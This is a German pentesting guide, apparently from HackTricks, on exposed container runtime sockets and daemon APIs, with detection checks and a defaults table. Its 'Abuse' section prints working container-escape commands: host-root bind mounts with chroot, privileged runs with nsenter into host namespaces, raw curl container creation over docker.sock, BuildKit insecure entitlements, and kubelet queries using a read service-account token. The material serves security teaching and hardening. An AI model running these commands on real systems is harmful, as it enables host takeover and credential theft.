# Runtime API Und Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Übersicht

Viele reale Container-Kompromittierungen beginnen überhaupt nicht mit einem Namespace-Escape. Sie beginnen mit Zugriff auf die Runtime-Control-Plane. Wenn ein Workload mit `dockerd`, `containerd`, CRI-O, Podman oder kubelet über einen eingebundenen Unix-Socket oder einen exponierten TCP-Listener kommunizieren kann, kann der Angreifer möglicherweise einen neuen Container mit höheren Privilegien anfordern, das Host-Dateisystem einbinden, Host-Namespaces beitreten oder sensible Node-Informationen abrufen. In diesen Fällen ist die Runtime API die eigentliche Sicherheitsgrenze, und ihre Kompromittierung ist funktional nahe an einer Host-Kompromittierung.

Darum sollte die Exposition von Runtime-Sockets getrennt von Kernel-Schutzmechanismen dokumentiert werden. Ein Container mit normalem seccomp, Capabilities und MAC-Isolation kann trotzdem nur einen API-Call von einer Host-Kompromittierung entfernt sein, wenn `/var/run/docker.sock` oder `/run/containerd/containerd.sock` darin eingebunden ist. Die Kernel-Isolation des aktuellen Containers kann genau wie vorgesehen funktionieren, während die Runtime-Management-Plane weiterhin vollständig exponiert bleibt.

## Daemon Access Models

Docker Engine stellt seine privilegierte API traditionell über den lokalen Unix-Socket unter `unix:///var/run/docker.sock` bereit. Historisch wurde sie auch remote über TCP-Listener wie `tcp://0.0.0.0:2375` oder einen durch TLS geschützten Listener auf `2376` exponiert. Das Remote-Exponieren des Daemons ohne starkes TLS und Client-Authentifizierung verwandelt die Docker API faktisch in eine Remote-Root-Schnittstelle.

containerd, CRI-O, Podman und kubelet exponieren ähnliche Oberflächen mit hohem Risiko. Die Namen und Workflows unterscheiden sich, aber die Logik nicht. Wenn die Schnittstelle dem Aufrufer erlaubt, Workloads zu erstellen, Host-Pfade einzubinden, Credentials abzurufen oder laufende Container zu verändern, ist die Schnittstelle ein privilegierter Management-Kanal und sollte entsprechend behandelt werden.

Häufige lokale Pfade, die es zu prüfen lohnt, sind:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Ältere oder stärker spezialisierte Stacks können auch Endpunkte wie `dockershim.sock`, `frakti.sock` oder `rktlet.sock` offenlegen. Diese sind in modernen Umgebungen seltener, sollten aber bei Auftreten mit derselben Vorsicht behandelt werden, da sie Runtime-Control-Interfaces und nicht gewöhnliche Anwendungs-Sockets darstellen.

## Secure Remote Access

Wenn ein Daemon über den lokalen Socket hinaus exponiert werden muss, sollte die Verbindung mit TLS geschützt werden und vorzugsweise mit mutual authentication, damit der Daemon den Client verifiziert und der Client den Daemon verifiziert. Die alte Gewohnheit, den Docker-Daemon aus Bequemlichkeit über plain HTTP zu öffnen, ist einer der gefährlichsten Fehler in der Container-Verwaltung, weil die API-Oberfläche stark genug ist, um direkt privilegierte Container zu erstellen.

Das historische Docker-Konfigurationsmuster sah so aus:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Auf systemd-basierten Hosts kann die Daemon-Kommunikation auch als `fd://` erscheinen, was bedeutet, dass der Prozess einen bereits geöffneten Socket von systemd erbt, statt ihn selbst direkt zu binden. Die wichtige Lehre ist nicht die genaue Syntax, sondern die Sicherheitsfolge. In dem Moment, in dem der Daemon über einen strikt berechtigten lokalen Socket hinaus lauscht, werden Transportsicherheit und Client-Authentifizierung zwingend erforderlich statt optionaler Härtung.

## Abuse

Wenn ein Runtime-Socket vorhanden ist, bestätige, welcher es ist, ob ein kompatibler Client existiert und ob roher HTTP- oder gRPC-Zugriff möglich ist:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Diese Befehle sind nützlich, weil sie zwischen einem toten Pfad, einem gemounteten, aber nicht zugänglichen Socket und einer live privilegierten API unterscheiden. Wenn der Client erfolgreich ist, lautet die nächste Frage, ob die API einen neuen Container mit einem Host-Bind-Mount oder Host-Namespace-Sharing starten kann.

### Wenn kein Client installiert ist

Das Fehlen von `docker`, `podman` oder einer anderen freundlichen CLI bedeutet nicht, dass der Socket sicher ist. Docker Engine spricht HTTP über seinen Unix-Socket, und Podman stellt über `podman system service` sowohl eine Docker-kompatible API als auch eine native Libpod-API bereit. Das bedeutet, dass eine minimale Umgebung mit nur `curl` möglicherweise immer noch ausreicht, um den Daemon anzusteuern:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Das ist während post-exploitation wichtig, weil Verteidiger manchmal die üblichen Client-Binaries entfernen, aber den Management-Socket eingehängt lassen. Auf Podman-Hosts gilt: Der wertvolle Pfad unterscheidet sich zwischen rootful und rootless deployments: `unix:///run/podman/podman.sock` für rootful service instances und `unix://$XDG_RUNTIME_DIR/podman/podman.sock` für rootless ones.

### Full Example: Docker Socket To Host Root

Wenn `docker.sock` erreichbar ist, besteht der klassische escape darin, einen neuen Container zu starten, der das Host-Root-Dateisystem einhängt, und dann per `chroot` hineinzugehen:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Dies ermöglicht direkte Host-Root-Ausführung über den Docker daemon. Die Auswirkungen beschränken sich nicht auf file reads. Sobald sich der attacker im neuen container befindet, kann er host files verändern, credentials ernten, persistence implantieren oder zusätzliche privileged workloads starten.

### Full Example: Docker Socket To Host Namespaces

Wenn der attacker namespace entry statt reinem filesystem-only access bevorzugt:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Dieser Pfad erreicht den Host, indem das Runtime darum gebeten wird, einen neuen Container mit expliziter Host-Namespace-Exposition zu erstellen, statt den aktuellen auszunutzen.

### Full Example: containerd Socket

Ein eingehängter `containerd`-Socket ist normalerweise genauso gefährlich:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Wenn ein eher Docker-ähnlicher Client vorhanden ist, kann `nerdctl` bequemer als `ctr` sein, weil es vertraute Flags wie `--privileged`, `--pid=host` und `-v` bereitstellt:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Der Effekt ist erneut eine Host-Kompromittierung. Selbst wenn Docker-spezifische Tools fehlen, kann eine andere Runtime-API dennoch dieselbe administrative Macht bieten. Auf Kubernetes-Nodes kann `crictl` ebenfalls für Reconnaissance und Container-Interaktion ausreichen, da es direkt mit dem CRI-Endpoint spricht.

### BuildKit Socket

`buildkitd` ist leicht zu übersehen, weil viele es nur als "das Build-Backend" betrachten, aber der Daemon ist weiterhin eine privilegierte Control Plane. Ein erreichbares `buildkitd.sock` kann einem Angreifer erlauben, beliebige Build-Schritte auszuführen, Worker-Fähigkeiten zu prüfen, lokale Contexts aus der kompromittierten Umgebung zu nutzen und gefährliche Entitlements wie `network.host` oder `security.insecure` anzufordern, wenn der Daemon so konfiguriert war, dass er sie erlaubt.

Nützliche erste Interaktionen sind:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Wenn der Daemon Build-Anfragen akzeptiert, teste, ob unsichere Entitlements verfügbar sind:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Der genaue Einfluss hängt von der Daemon-Konfiguration ab, aber ein rootful BuildKit-Service mit großzügigen entitlements ist keine harmlose Entwickler-Bequemlichkeit. Betrachte ihn als eine weitere administrative High-Value-Angriffsfläche, besonders auf CI-Runners und gemeinsamen Build-Nodes.

### Kubelet API Over TCP

Das kubelet ist kein container runtime, aber es ist dennoch Teil der Node-Management-Plane und gehört oft in dieselbe Trust-Boundary-Diskussion. Wenn der kubelet secure port `10250` vom workload aus erreichbar ist oder wenn Node-Credentials, kubeconfigs oder Proxy-Rechte offengelegt sind, kann der Angreifer möglicherweise Pods auflisten, Logs abrufen oder Befehle in node-local Containern ausführen, ohne jemals den Kubernetes API server Admission Path zu berühren.

Beginne mit günstiger Discovery:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Wenn der kubelet- oder API-server-proxy-Pfad `exec` autorisiert, kann ein WebSocket-fähiger Client daraus Codeausführung in anderen Containern auf dem Node machen. Das ist auch der Grund, warum `nodes/proxy` mit nur `get`-Berechtigung gefährlicher ist, als es klingt: Die Anfrage kann trotzdem kubelet-Endpunkte erreichen, die Befehle ausführen, und diese direkten kubelet-Interaktionen tauchen nicht in normalen Kubernetes-Audit-Logs auf.

## Checks

Das Ziel dieser Checks ist es zu beantworten, ob der Container irgendeine Management-Ebene erreichen kann, die außerhalb der Trust Boundary hätte bleiben sollen.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Was hier interessant ist:

- Eine gemountete Runtime-Socket ist normalerweise ein direktes administratives Primitive und nicht nur eine reine Informationsoffenlegung.
- Ein TCP-Listener auf `2375` ohne TLS sollte als Remote-Compromise-Bedingung behandelt werden.
- Umgebungsvariablen wie `DOCKER_HOST` zeigen oft, dass der Workload absichtlich dafür entworfen wurde, mit der Host-Runtime zu sprechen.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | `dockerd` lauscht auf dem lokalen Socket und der Daemon ist normalerweise rootful | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | Daemonless CLI by default | Für die normale lokale Nutzung ist kein langfristig laufender privilegierter Daemon erforderlich; API-Sockets können aber trotzdem exposed sein, wenn `podman system service` aktiviert ist | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Local privileged socket | Administrative API exposed through the local socket and usually consumed by higher-level tooling | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Local privileged socket | Der CRI-Endpoint ist für node-lokale vertrauenswürdige Komponenten gedacht | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | Node-local management API | Kubelet sollte nicht breit von Pods aus erreichbar sein; der Zugriff kann Pod-Status, Credentials und Ausführungsfunktionen offenlegen, abhängig von authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
